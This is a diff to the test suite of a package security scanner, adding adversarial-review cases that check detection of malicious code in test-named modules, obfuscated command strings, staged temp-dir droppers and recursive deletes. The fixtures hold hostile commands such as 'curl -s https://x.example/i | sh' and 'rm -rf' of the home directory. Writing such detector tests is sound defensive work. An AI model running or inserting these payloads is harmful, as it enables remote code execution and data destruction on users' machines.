@@ -388,22 +388,18 @@ class TestTextAndConstants:
         f = _named(_scan(code, "client.js"), "Generic API Key")
         assert f and f[0].severity == "high"
 
-    def test_a_shipped_test_suite_module_is_not_runtime(self):
+    def test_a_test_named_module_at_the_package_root_is_scanned(self):
+        # A self-declared name never removes coverage (adversarial review of #160): a
+        # package's `tests.py` / `testing.py` is scanned like any module.
         fetched = ArtifactFetchResult(ecosystem="pypi", name="p", version="1", kind="sdist",
                                       ok=True)
-        suite = ("import unittest\nimport subprocess\n"
+        suite = ("import unittest\nimport os\n"
                  "class T(unittest.TestCase):\n    def test_x(self):\n"
-                 "        subprocess.check_call(command_line)\n"
-                 "TOKEN = 'hf_94wBhPGp6KrrTH3KDchhKpRxZwd6dmHWLL'\n")
-        runtime = ("import operator\ndef test_odd(value):\n    return value % 2 == 1\n"
-                   "import os\nos.system('curl -s https://x.example/i | sh')\n")
+                 "        os.system('curl -s https://x.example/i | sh')\n")
         fetched.files["coloredlogs/tests.py"] = _make_file("coloredlogs/tests.py", suite.encode())
-        fetched.files["jinja2/tests.py"] = _make_file("jinja2/tests.py", runtime.encode())
         findings, scanned, _ = scan_artifact_files(fetched)
-        paths = {f.file_path for f in _highs(findings)}
-        assert "coloredlogs/tests.py" not in paths
-        assert "jinja2/tests.py" in paths  # name alone is not a test suite
         assert scanned == 1
+        assert "coloredlogs/tests.py" in {f.file_path for f in _highs(findings)}
 
 
 # ── 9. unpinned npx in help text and maintainer scripts ───────────────────────
@@ -573,3 +569,106 @@ class TestWheelFirstClasses:
     ])
     def test_unsafe_yaml_loads_still_fire(self, code):
         assert _highs(_named(_scan(code, "a.py"), "yaml.load"))
+
+
+# ── 13. adversarial recall review of PR #160 (coordinator, 2026-10-14) ───────────
+# Each of these failed on the PR head before the fix: a high/critical shape that the
+# precision pass had made silent or medium.
+
+def _artifact(files: dict[str, str], eco: str = "pypi"):
+    fetched = ArtifactFetchResult(ecosystem=eco, name="evilpkg", version="1", kind="sdist"
+                                  if eco == "pypi" else "tarball", ok=True)
+    for p, body in files.items():
+        fetched.files[p] = _make_file(p, body.encode())
+    findings, _n, _h = scan_artifact_files(fetched)
+    return findings
+
+
+class TestAdversarialRecall:
+    # 1. a self-declared test module is never dropped to zero coverage
+    @pytest.mark.parametrize("path,body,eco", [
+        ("evilpkg/testing.py",
+         "import pytest, os, urllib.request\n"
+         "urllib.request.urlopen('http://x.example/i').read()\n"
+         "os.system('curl -s x.example/i | sh')\n", "pypi"),
+        ("evilpkg/tests.py",
+         "import unittest, os\nos.system('curl -s https://x.example/i | sh')\n", "pypi"),
+        ("lib/test.js",
+         "const test = require('tape');\nconst { execSync } = require('child_process');\n"
+         "execSync('curl -s https://x.example/i | sh');\n", "npm"),
+    ])
+    def test_a_test_named_module_with_a_payload_is_still_scanned(self, path, body, eco):
+        f = _highs(_artifact({path: body}, eco))
+        assert f and any(x.file_path == path for x in f), [(x.name, x.severity) for x in f]
+
+    # 2. obfuscated assembly is never quieter than the plain string
+    @pytest.mark.parametrize("code,path", [
+        ('os.system(" ".join(["curl", "-s", host, "|", "sh"]))\n', "a.py"),
+        ('os.system(" ".join(["curl", "-s", host, ";", "sh", "-c", "x"]))\n', "a.py"),
+        ('cmd = "".join(chr(c) for c in [99, 117, 114, 108])\nos.system(cmd + " host")\n',
+         "a.py"),
+        ('cmd = bytes([99, 117, 114, 108]).decode()\nos.system(cmd + " host")\n', "a.py"),
+        ('cmd = bytearray([99, 117, 114, 108]).decode()\nos.system(cmd + " host")\n', "a.py"),
+        ("const cp = require('child_process');\n"
+         "cp.execSync(['curl', '-s', host, '|', 'sh'].join(' '));\n", "a.js"),
+        ("const cp = require('child_process');\n"
+         "const c = String.fromCharCode(99, 117, 114, 108);\ncp.execSync(c + ' ' + host);\n",
+         "a.js"),
+    ])
+    def test_obfuscated_assembly_stays_high(self, code, path):
+        d = [f for f in _defects(_scan(code, path)) if f.category == "unsafe_exec"]
+        assert d and d[0].severity in ("high", "critical"), [(f.severity, f.remediation)
+                                                             for f in d]
+
+    # 3. staged dropper: a shell runs a script from a temp dir
+    @pytest.mark.parametrize("code,path", [
+        ('def stage2():\n    os.system("sh /tmp/x.sh")\n', "a.py"),
+        ('subprocess.run(["bash", "/dev/shm/.u.sh"])\n', "a.py"),
+        ("const cp = require('child_process');\ncp.execSync('bash /var/tmp/p.sh');\n", "a.js"),
+    ])
+    def test_shell_on_a_temp_dir_script_is_high(self, code, path):
+        d = [f for f in _defects(_scan(code, path)) if f.category == "unsafe_exec"]
+        assert d and d[0].severity in ("high", "critical"), [(f.severity, f.remediation)
+                                                             for f in d]
+
+    # 4. recursive delete of a runtime path
+    @pytest.mark.parametrize("code,path", [
+        ('os.system("rm -rf " + os.environ["HOME"])\n', "a.py"),
+        ('os.system(f"rm -r {target}")\n', "a.py"),
+        ("const cp = require('child_process');\ncp.execSync(`rm -rf ${dir}`);\n", "a.js"),
+    ])
+    def test_recursive_delete_of_a_runtime_path_is_high(self, code, path):
+        d = [f for f in _defects(_scan(code, path)) if f.category == "unsafe_exec"]
+        assert d and d[0].severity in ("high", "critical"), [(f.severity, f.remediation)
+                                                             for f in d]
+
+    # the fixes above stay narrow: benign shapes of the same constructs are medium
+    @pytest.mark.parametrize("code,path", [
+        ('os.system(" ".join(["git", "status", "--short"]))\n', "a.py"),
+        ('os.system("tar czf /tmp/out.tgz build")\n', "a.py"),
+        ('os.system("rm -rf build dist")\n', "a.py"),
+        ("const cp = require('child_process');\ncp.execSync(['git', 'log', ref].join(' '));\n",
+         "a.js"),
+        ("const cp = require('child_process');\ncp.execSync(`git -C ${dir} status`);\n", "a.js"),
+    ])
+    def test_benign_shapes_of_the_same_constructs_stay_medium(self, code, path):
+        d = [f for f in _defects(_scan(code, path)) if f.category == "unsafe_exec"]
+        assert d and all(f.severity == "medium" for f in d), [(f.severity, f.remediation)
+                                                              for f in d]
+
+    def test_inline_code_joined_from_constants_is_a_constant_snippet(self):
+        # coloredlogs tests.py: python -c ";".join(["import coloredlogs, logging", ...])
+        code = ('p = subprocess.Popen([\n    sys.executable, "-c", ";".join([\n'
+                '        "import coloredlogs, logging",\n        "coloredlogs.install()",\n'
+                '    ]),\n], stderr=subprocess.PIPE)\n')
+        f = _named(_scan(code, "tests.py"), "subprocess.run")
+        assert f and all(x.kind == "capability" for x in f)
+
+    @pytest.mark.parametrize("code", [
+        'subprocess.run([sys.executable, "-c", ";".join(["import os", '
+        '"os.system(\'curl -s x | sh\')"])])\n',
+        'subprocess.run(["sh", "-c", " ".join(["curl", "-s", "https://x.example/i", "|", '
+        '"sh"])])\n',
+    ])
+    def test_joined_payload_code_stays_high(self, code):
+        assert _highs(_named(_scan(code, "a.py"), "subprocess.run"))
